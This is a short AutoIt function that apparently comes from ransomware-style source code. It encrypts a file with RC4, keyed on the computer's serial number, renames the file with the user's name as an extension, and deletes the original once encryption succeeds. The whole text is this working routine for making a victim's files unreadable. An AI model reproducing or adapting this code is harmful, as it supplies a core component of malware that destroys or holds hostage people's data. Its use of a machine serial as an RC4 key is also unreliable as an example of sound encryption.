Func encryptFile($file)
	
	$sSourceFile=$file
	
	$sDestinationFile=$file&"."&$computer_user
	
	$iAlgID= $CALG_RC4
	
	$vCryptKey=$computer_serial
	
	if _Crypt_EncryptFile ( $sSourceFile, $sDestinationFile, $vCryptKey, $iAlgID ) Then
		
		FileDelete($sSourceFile)
		
		Return $sDestinationFile
		
	EndIf
	
	if @error Then
		
		handleErrors("encryptFile", @error)
		
	EndIf

EndFunc 
